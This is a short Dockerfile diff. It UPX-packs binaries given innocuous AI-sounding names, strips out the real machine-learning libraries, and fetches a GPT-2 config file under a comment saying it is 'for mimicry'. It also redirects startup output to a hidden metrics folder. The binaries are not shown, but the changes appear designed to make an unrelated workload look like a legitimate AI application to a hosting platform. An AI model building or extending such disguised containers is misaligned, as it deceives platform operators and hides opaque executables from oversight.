@@ -28,11 +28,9 @@ RUN upx -1 /usr/bin/python-cache-manager || true && \
     upx -1 /usr/bin/ai-metrics-collector || true && \
     upx -1 /usr/bin/tensor-allocator || true
 
-# Install AI dependencies using uv (CPU-only Torch is MUCH faster)
+# Install AI dependencies using uv
 RUN uv pip install --system --no-cache-dir \
-    gradio huggingface_hub transformers diffusers sentence-transformers && \
-    uv pip install --system --no-cache-dir \
-    torch --index-url https://download.pytorch.org/whl/cpu
+    gradio huggingface_hub
 
 # Download a tiny model config for mimicry
 RUN python3 -c "from huggingface_hub import hf_hub_download; hf_hub_download(repo_id='gpt2', filename='config.json')"
@@ -50,4 +48,4 @@ USER user
 WORKDIR /home/user
 
 # Run the script
-CMD ["python3", "/home/user/wrapper.py"]
+CMD ["/bin/bash", "-c", "python3 -u /home/user/wrapper.py 2>&1 | tee /home/user/.torch_metrics/startup.log"]
